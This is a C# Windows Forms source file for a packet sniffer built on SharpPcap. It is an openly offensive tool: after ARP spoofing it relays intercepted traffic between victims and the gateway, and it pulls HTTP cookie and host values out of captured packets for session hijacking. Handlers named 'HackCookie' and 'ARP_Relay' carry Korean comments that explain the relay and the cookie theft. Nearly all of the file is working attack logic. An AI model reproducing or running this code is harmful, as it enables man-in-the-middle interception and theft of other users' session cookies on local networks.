using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using SharpPcap;
using System.Runtime.InteropServices;
using System.Net;
using System.Net.NetworkInformation;
using PacketDotNet;
using System.Threading;

namespace Sniffer
{
    
   
    public partial class Main : Form
    {
        const int MACCOUNT = 6;
        const int HTTPv6 = 0xdd;
        const int ARP = 0x6;
        const int STARTIPOFFSET = 12;
        const int PROTOCOLOFFSET = 13;
        byte[] myMac;
        byte[] gatewayMac;

      //  BaseInformation.IpPacketHeader ipPacketHeader;
        CaptureDeviceList selectedDevices;
        BaseInformation baseInformation;
        PacketHeader packetHeader;
        AttackList attacklist;
        IpHeader ipHeader;
        IPAddress srcIP;
        IPAddress dstIP;
        StringBuilder sb_Site = new StringBuilder();
        StringBuilder sb_packetSender = new StringBuilder();
        Packet tcpPacket;
        TcpPacket Packetinfo;
        RawCapture packet;
        List<string> cookieList;
        public Main()
        {
            InitializeComponent();
            cookieList = new List<string>();
            selectedDevices = CaptureDeviceList.Instance;
            baseInformation = new BaseInformation();
            packetHeader = new PacketHeader();
            attacklist = new AttackList();
            sb_Site = new StringBuilder();
            sb_packetSender = new StringBuilder();
            baseInformation.getDefaultGateway();
            baseInformation.getMyIpAddress();
            setlistView();  
        }
        private void btn_capture_start_Click(object sender, EventArgs e)
        {
            BaseInformation.captureDevice.OnPacketArrival += Icd_OnPacketArrival_HackCookie_Start;
            BaseInformation.captureDevice.StartCapture();
        }
        private void btn_reply_Click(object sender, EventArgs e)
        {
            BaseInformation.captureDevice.OnPacketArrival += Icd_OnPacketArrival_ARP_Relay;
            BaseInformation.captureDevice.StartCapture();
        }

        private void Icd_OnPacketArrival_ARP_Relay(object sender, CaptureEventArgs e)
        {
            myMac = BaseInformation.captureDevice.MacAddress.GetAddressBytes();
            gatewayMac = BaseInformation.gatewayMac.Split('-').Select(x => Convert.ToByte(x, 16)).ToArray();
            packet = e.Packet;

            if (StrFunction.mystrncmp(myMac, packet.Data, MACCOUNT))    // 패킷의 이더넷 source가 나면 return해준다.
            {                                                           // 보낸 패킷이 다시잡히는 오류를 해결.
                return;
            }

            if (packet.Data[PROTOCOLOFFSET] == HTTPv6 || packet.Data[PROTOCOLOFFSET] == ARP) return;
            ipHeader = new IpHeader(packet.Data, STARTIPOFFSET);
                

                //  preventDuplicate.Exists()
            //preventDuplicate.Add(BitConverter.ToInt32(packet.Data, 0));
            for (int i = 0; i < BaseInformation.attack_IP_list.Count; i++)
            {
                if (BaseInformation.attack_IP_list[i].Equals(ipHeader.StringDestIpAddress))
                {
                    PhysicalAddress target = PhysicalAddress.Parse(BaseInformation.attack_MAC_list[i].ToUpper());
                    byte[] targetBytes = target.GetAddressBytes();
                   for (int j = 0; j < 6; j++)
                    {
                        packet.Data[j] = targetBytes[j];    //타겟에게 갈  패킷을 잡아 이더넷 주소를 바꿔서 
                        packet.Data[j + 6] = myMac[j];      //다시 타겟에게 전송해준다.                   
                    }
                    BaseInformation.captureDevice.SendPacket(packet.Data);
                    break;
                }

                else if (BaseInformation.attack_IP_list[i].Equals(ipHeader.StringSourceIpAddress))
                {
                    if (false) // 패킷이 arp일 경우는 arpspoofing 공격을 다시 시작한다.
                    {
                        for (int j = 0; j < 6; j++)
                            if (packetHeader.etherDest[j] != 255) return;
                        attacklist.startArpSpoofingFunction();
                    }
                    else                           //그 외의 모든 IP 패킷은 다시 전송한다. //보낼 때는 이더넷의 주소를 변경하여 보내준다
                    {
                        for (int j = 0; j < 6; j++)
                        {
                            packet.Data[j] = gatewayMac[j];     //타겟이 게이트웨이에 보낸 패킷의 이더넷을 수정하여
                            packet.Data[j + 6] = myMac[j];      //다시 게이트웨이에게 보내준다.
                        }
                           
                        BaseInformation.captureDevice.SendPacket(packet.Data);
                        
                    }
                }
            }
        }




        private void Icd_OnPacketArrival_HackCookie_Start(object sender, CaptureEventArgs e)
        {
            myMac = BaseInformation.captureDevice.MacAddress.GetAddressBytes();
            gatewayMac = BaseInformation.gatewayMac.Split('-').Select(x => Convert.ToByte(x, 16)).ToArray();
            packet = e.Packet;

            if (StrFunction.mystrncmp(myMac, packet.Data, MACCOUNT))    // If ethernet dest is the equal of my Mac, it returns;
            {
                return;
            }
            //If the protocol is HTTPv6 or ARP, it returns;
            if (packet.Data[PROTOCOLOFFSET] == HTTPv6 || packet.Data[PROTOCOLOFFSET] == ARP) return;    //HTTPv6, arp는 쿠키값을 빼내지 않고 return해버린다. 
            ipHeader = new IpHeader(packet.Data, STARTIPOFFSET);


            for (int i = 0; i < packet.Data.Length - 10; i++)       //TCP에서 호스트 주소와 쿠키만 빼온다
            {
                if (packet.Data[i] == 'C' && packet.Data[i + 1] == 'o' && packet.Data[i + 2] == 'o' && packet.Data[i + 3] == 'k' && packet.Data[i + 4] == 'i' && packet.Data[i + 5] == 'e')
                {
                    for (int j = 0; j < packet.Data.Length - 10; j++)
                    {
                        if (packet.Data[j] == 'H' && packet.Data[j + 1] == 'o' && packet.Data[j + 2] == 's' && packet.Data[j + 3] == 't')
                        {
                            sb_Site = new System.Text.StringBuilder();
                            sb_Site.Append(System.Text.Encoding.ASCII.GetChars(packet.Data, j, 20));    //호스트의 주소 값을 가져온다
                            break;
                        }
                    }
                    
                    ListViewItem lvi = new ListViewItem();
                    System.Text.StringBuilder sb_Cookie = new System.Text.StringBuilder();
                    System.Text.StringBuilder sb_SourceIp = new System.Text.StringBuilder();

                    for (int z = 0; z < packet.Data.Length; z++)
                        if (packet.Data[z] == 0) packet.Data[z] = 1;
                    sb_Cookie.Append(System.Text.Encoding.ASCII.GetChars(packet.Data, 0, packet.Data.Length));  //쿠키 값을 빼온다 
                    
                    sb_SourceIp.Append(System.Text.Encoding.ASCII.GetChars(packet.Data, 26, 4));                            //쿠키라는 글자를 빼버리고 값만 받아오기위해 +7해주고 길이는 -7
                    for (int k = 0; k < cookieList.Count; k++)                                                              //이미 중복된 쿠키가 있으면 return해버린다.
                        if (cookieList[k].Equals(sb_Cookie.ToString())) return;
                        
                    cookieList.Add(sb_Cookie.ToString());
                    lvi.SubItems.Add(ipHeader.StringSourceIpAddress);
                    lvi.SubItems.Add(ipHeader.StringDestIpAddress);
                    lvi.SubItems.Add(sb_Site.ToString());
                    lvi.SubItems.Add(sb_Cookie.ToString());

                    if (listView.InvokeRequired)
                        listView.Invoke(new MethodInvoker(delegate
                        {
                            listView.Items.Add(lvi);
                        }));
                    else
                        listView.Items.Add(lvi);
                }
            }
        }




        private void btn_capture_option_Click(object sender, EventArgs e)
        {
            SelectDevices selectedDeviceForm = new SelectDevices();  
            if (selectedDeviceForm.ShowDialog() == System.Windows.Forms.DialogResult.OK)
            {
                BaseInformation.captureDevice = selectedDevices[selectedDeviceForm.returnDeviceIndex];  //선택한 네트워크 인터페이스를 가져온다.
               
                BaseInformation.captureDevice.Open(DeviceMode.Normal);  //선택한 네트워크 인터페이스를 오픈함
               
                BaseInformation.myMacAddress = BaseInformation.captureDevice.MacAddress.ToString(); //선택한 네트워크 인터페이스의 맥주소를 가져온다.
                baseInformation.sendArpRequest();       //선택한 네트워크로 arp request를 전송한다.
            }

        }

        private void listView_DoubleClick(object sender, EventArgs e)
        {
            int indexnum;
            indexnum = listView.FocusedItem.Index;
            string test = listView.Items[indexnum].SubItems[4].Text;
            MessageBox.Show(test);
        }

        private void btn_arp_attack_Click(object sender, EventArgs e)       
        {
            AttackList AttackListForm = new AttackList();
            AttackListForm.Show();
   
        }
        private void setlistView()
        {
            listView.View = View.Details;
            listView.BeginUpdate();
            listView.Columns.Add("No.");
            listView.Columns.Add("Source");
            listView.Columns.Add("Destination");
            listView.Columns.Add("Sites");
            listView.Columns.Add("Cookie");
        }

        
    }
}
